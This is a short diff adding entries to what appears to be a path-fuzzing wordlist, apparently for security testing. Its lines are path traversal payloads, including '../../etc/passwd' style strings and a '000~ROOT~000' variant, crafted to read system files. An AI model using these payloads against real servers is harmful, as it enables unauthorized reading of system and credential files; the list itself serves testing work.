@@ -1,3 +1,5 @@
+home/000~ROOT~000
+home/000~ROOT~000/etc/passwd
 appsettings.json
 /////////////////../../../../../../../../etc/passwd
 _
